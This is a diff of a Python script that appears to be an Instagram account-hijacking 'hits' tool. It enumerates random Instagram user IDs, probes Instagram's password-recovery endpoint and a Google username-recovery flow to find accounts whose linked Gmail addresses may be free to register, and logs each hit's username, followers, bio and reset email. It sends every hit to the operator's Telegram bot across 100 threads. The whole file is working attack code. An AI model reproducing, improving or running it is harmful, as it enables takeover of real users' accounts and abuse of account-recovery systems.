@@ -1,3 +1,18 @@
+print("senpai x annu collab tool")
+import datetime
+#import pytz
+
+#end_datetime = datetime.datetime(2025, 3, 6, 10, 30, 0) #
+#iraq_timezone = pytz.timezone("Asia/Baghdad") #
+
+#remaining_time = end_datetime.astimezone(iraq_timezone) - datetime.datetime.now(iraq_timezone)
+#print(f"[-] The Remaining Time : {remaining_time}")
+
+#if datetime.datetime.now(iraq_timezone) >= end_datetime.astimezone(iraq_timezone):
+    #print("[!] The Specified Time Has Expired") #
+    #exit(0)
+
+
 import os
 import sys
 import re
@@ -17,11 +32,8 @@ from cfonts import render, say
 from colorama import Fore, Style, init
 import webbrowser
 
-# --- CONFIGURATION (Updated Filters) ---
-MIN_FOLLOWERS = 20 # Minimum Followers set to 20
-MIN_POSTS = 1      # Minimum Posts set to 1
 
-
+webbrowser.open
 init(autoreset=True)
 
 INSTAGRAM_RECOVERY_URL = 'https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/'
@@ -86,24 +98,15 @@ bad_email = 0
 good_ig = 0
 infoinsta = {}
 
-banner = render('{senpai}', colors=['white', 'blue'], align='center')
-print(f'''
-\033[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-                      {banner}
-\033[2;36m CHANNEL : @senpai_era| DEV : @jaorg
-\033[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-''')
+banner = render('ayushi', colors=['white', 'blue'], align='center')
 
-ID = input('\033[1;33m -  𝐈𝐃 : ')
-print("\033[1;34m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-TOKEN = input('\033[1;33m - 𝐓𝐨𝐤𝐞𝐧 : ')
+ID = input("ID: ")
+TOKEN = input("Bot Token ")
 os.system('clear')
 
-
-
 def update_stats():
-    # @aryan ;
-    sysdontwrite = f"""\r{C1}Hits{P1} : {hits}{J21} |{Z} Bad IG{P} : {J21}{bad_insta}{P} | {Z}Bad Email{B} : {J21}{bad_email}{Z} | {P}Good IG{Z} : {J21}{good_ig}"""
+    # collab tool by senpai ;
+    sysdontwrite = f"""\r{C1}𝐡𝐢𝐭𝐬{P1} : {hits}{J21} |{Z} Bad IG{P} : {J21}{bad_insta}{P} | {Z}Bad Email{B} : {J21}{bad_email}{Z} | {P}𝐆𝐨𝐨𝐝{Z} : {J21}{good_ig}"""
     sys.stdout.write(sysdontwrite)
     sys.stdout.flush()
 
@@ -123,18 +126,10 @@ def Eizon():
         recovery_url = (f"{GOOGLE_ACCOUNTS_URL}/signin/v2/usernamerecovery"
                         "?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB")
         res1 = requests.get(recovery_url, headers=headers)
-        
-        # Using a more robust regex check
-        match = re.search(
+        tok = re.search(
             'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',
             res1.text
-        )
-        if match:
-             tok = match.group(2)
-        else:
-            # Fallback or retry if token extraction fails
-            raise ValueError("Token not found in response.")
-
+        ).group(2)
         cookies = {'__Host-GAPS': host}
         headers2 = {
             AUTHORITY_HEADER: GOOGLE_ACCOUNTS_DOMAIN,
@@ -159,6 +154,7 @@ def Eizon():
         with open(TOKEN_FILE, 'w') as f:
             f.write(f"{token_line}//{host}\n")
     except Exception as e:
+        print(e)
         Eizon()
 
 Eizon()
@@ -226,14 +222,11 @@ def check(email):
         IG_SIG_KEY_VERSION: '4'
     }
     response = requests.post(INSTAGRAM_RECOVERY_URL, headers=headers, data=data).text
-    
-    # Instagram recovery check
     if email in response:
-        good_ig += 1
-        update_stats()
-        # If Instagram account exists, now check if the Gmail is available
         if eizon_domain in email:
             check_gmail(email)
+        good_ig += 1
+        update_stats()
     else:
         bad_insta += 1
         update_stats()
@@ -280,85 +273,57 @@ def rest(user):
     return eizonporno
 
 def date(hy):
-    """Calculates registration year based on Instagram user ID range."""
     try:
-        hy = int(hy)
-    except:
-        return 'N/A'
-        
-    ranges = [
-        (1279000, 2010),
-        (17750000, 2011),
-        (279760000, 2012),
-        (900990000, 2013),
-        (1629010000, 2014),
-        (2500000000, 2015),
-        (3713668786, 2016),
-        (5699785217, 2017),
-        (8597939245, 2018),
-        (21254029834, 2019),
-        (43464475395, 2020),
-        (50289297647, 2021),
-        (57464707082, 2022),
-        (63313426938, 2023),
-    ]
-    
-    for upper, year in sorted(ranges):
-        if hy <= upper:
-            return year
-    return "2024+"
+        ranges = [
+            (1279000, 2010),
+            (17750000, 2011),
+            (279760000, 2012),
+            (900990000, 2013),
+            (1629010000, 2014),
+            (2500000000, 2015),
+            (3713668786, 2016),
+            (5699785217, 2017),
+            (8597939245, 2018),
+            (21254029834, 2019),
+        ]
+        for upper, year in ranges:
+            if hy <= upper:
+                return year
+        return 2023
+    except Exception:
+        pass
 
 def InfoAcc(username, domain):
-    global total_hits, MIN_FOLLOWERS, MIN_POSTS, ID, TOKEN
+    global total_hits
     account_info = infoinsta.get(username, {})
-    
-    # --- Data Extraction and Validation ---
-    user_id = account_info.get('pk', 'N/A')
-    followers = account_info.get('follower_count', 0)
-    posts = account_info.get('media_count', 0)
-    
-    # 💥 APPLY FOLLOWERS AND POSTS FILTER HERE 💥
-    try:
-        # Check if the account meets the minimum followers and posts criteria
-        if int(followers) < MIN_FOLLOWERS or int(posts) < MIN_POSTS:
-            return # Hit discard if filters are not met
-    except:
-        return
-
-    # --- Data Formatting ---
+    user_id = account_info.get('pk')
+    full_name = account_info.get('full_name')
+    followers = account_info.get('follower_count')
+    following = account_info.get('following_count')
+    posts = account_info.get('media_count')
+    bio = account_info.get('biography')
     total_hits += 1
-    full_name = account_info.get('full_name', 'N/A')
-    following = account_info.get('following_count', 'N/A')
-    bio = account_info.get('biography', 'No bio')
-    reg_date = date(user_id)
-    reset_email = rest(username)
-    
     info_text = f"""
-╭━─━─━─━─━─━─━─━─━─━─━─━─━╮
-┃      ⚔️ 𝐒 𝐄 𝐍 𝐏 𝐀 𝐈   𝐄 𝐑 𝐀 ⚔️      ┃
-╰━─━─━─━─━─━─━─━─━─━─━─━─━╯
-╺─────────────────────────────────────╸
+𝐂𝐎𝐋𝐋𝐀𝐁 𝐓𝐎𝐎𝐋 𝐁𝐘 ~ SENPAI X ANNU 
+⇶⇶⇶⇶⇶⇶⇶⇶⇶⇶⇶⇶⇶⇶
+≪≪≪≪≪≪≪≪≫≫≫≫≫≫≫≫≫≫≫
 
- ⭐ 𝗛𝗜𝗧𝗦           | {stats[total_hits]}
- ─────────────────────────────────────
- 👾 𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘        | [ {username} ]
- 📧 𝗘𝗠𝗔𝗜𝗟          | [ {username}@{domain} ]
- 👥 𝗙𝗢𝗟𝗟𝗢𝗪𝗘𝗥𝗦       | [ {followers} ]
- 🚶 𝗙𝗢𝗟𝗟𝗢𝗪𝗜𝗡𝗚        |[ {following} ]
- 🗓️ 𝗬𝗘𝗔𝗥           |[ {reg_date} ]
- 📝 𝗕𝗜𝗢            |[ {bio} ]
- 🔑 𝗥𝗘𝗦𝗘𝗧 𝗟𝗜𝗡𝗞      |[ {reset_email} ]
- 🌐 𝗜𝗚 𝗟𝗜𝗡𝗞         | [ www.instagram.com/{username} ]
-
-╺─────────────────────────────────────╸
-   ©️ 𝖣𝖤𝖵𝖫𝖮𝖯𝖤𝖱 : @senpai_era | 𝖳𝖤𝖠𝖬 : @senpai_era
+FREE KA 𝐇𝐈𝐓 :  {total_hits}  
+𝐔𝐒𝐄𝐑𝐍𝐀𝐌 :  {username} 
+𝐄𝐌𝐀𝐈𝐋 : [ {username}@{domain} 
+𝐅𝐎𝐋𝐋𝐎𝐖𝐒: :  {followers} 
+𝐅𝐎𝐋𝐋𝐎𝐖𝐆: :  {following} 
+𝐏𝐎𝐒𝐓𝐒 :  {posts} 
+𝐃𝐀𝐓𝐄 :  ? 
+𝐏𝐈𝐎 : {bio} 
+𝐑𝐄𝐒𝐓 :  {rest(username)}
+═════════════════
+ 𝖊𝖓𝖏𝖔𝖞 𝖇𝖗𝖔𝖙𝖍𝖊𝖗𝖘 𝖆𝖓𝖉 𝖑𝖆𝖉𝖎𝖊𝖘 💎
 """
-    with open('senpai.txt', 'a') as f:
+    with open('hits.txt', 'a') as f:
         f.write(info_text + "\n")
     try:
-        # Send Telegram message
-        requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage", 
-                     params={'chat_id': ID, 'text': info_text, 'parse_mode': 'HTML'})
+        requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text={info_text}")
     except Exception:
         pass
 
@@ -367,8 +332,7 @@ def eizon_python():
         data = {
             'lsd': ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
             'variables': json.dumps({
-                # Random ID generation range
-                'id': int(random.randrange(900990000, 50289297647)),
+                'id': int(random.randrange(266028916, 1900000000)),
                 'render_surface': 'PROFILE'
             }),
             'doc_id': '25618261841150840'
@@ -378,28 +342,15 @@ def eizon_python():
             response = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data)
             account = response.json().get('data', {}).get('user', {})
             username = account.get('username')
-            
             if username:
-                # Store full account info right after fetching
                 infoinsta[username] = account
-                
-                # Check for minimum posts/followers before doing the expensive email check
-                followers = account.get('follower_count', 0)
-                posts = account.get('media_count', 0)
-                
-                if int(followers) >= MIN_FOLLOWERS and int(posts) >= MIN_POSTS:
-                    emails = [username + eizon_domain]
-                    for email in emails:
-                        # This check function performs the Instagram recovery check
-                        # and then calls check_gmail/InfoAcc if successful.
-                        check(email) 
-                        
+                emails = [username + eizon_domain]
+                for email in emails:
+                    check(email)
         except Exception:
             pass
 
-# Rerunning Eizon to ensure the token is fresh with the new logic
-Eizon()
-
-for _ in range(200):
+for _ in range(100):
     Thread(target=eizon_python).start()
-    
+
+
